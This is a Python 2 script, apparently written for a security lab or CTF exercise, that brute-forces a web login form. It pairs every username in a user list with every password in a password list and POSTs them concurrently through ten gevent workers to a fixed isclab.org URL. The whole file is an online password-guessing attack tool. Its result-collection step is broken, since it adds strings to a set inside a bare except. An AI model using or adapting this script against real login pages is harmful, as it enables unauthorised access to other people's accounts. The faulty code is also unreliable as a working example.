# coding=utf-8
import gevent
import gevent.monkey
gevent.monkey.patch_all()
import gevent.queue

import sys
import re
import os
import requests

reload(sys)
sys.setdefaultencoding('utf-8')

infos = gevent.queue.Queue()
Q = gevent.queue.Queue()

def get_resp():
    while True:
        try:
            info = infos.get(timeout=1)
            print info
            r = requests.post(
                "http://www.isclab.org/script2/2013/script3/", info)
            Q.put(r.text)
            print r.text
        except gevent.queue.Empty:
            break

if __name__ == '__main__':
    with open("users.txt") as users_file:
        users = [line.strip() for line in users_file]
    with open("password.txt") as password_file:
        passwords = [line.strip() for line in password_file]

    res = set()
    for user in users:
        for password in passwords:
            info = {'username': user,
                'password': password,
                'submit': 'Submit'}
            infos.put_nowait(info)

    workers = [gevent.spawn(get_resp) for i in xrange(10)]
    gevent.joinall(workers)

    res = set()
    while(True):
        try:
            res += Q.get_nowait()
        except:
            break
    for item in res:
        print item
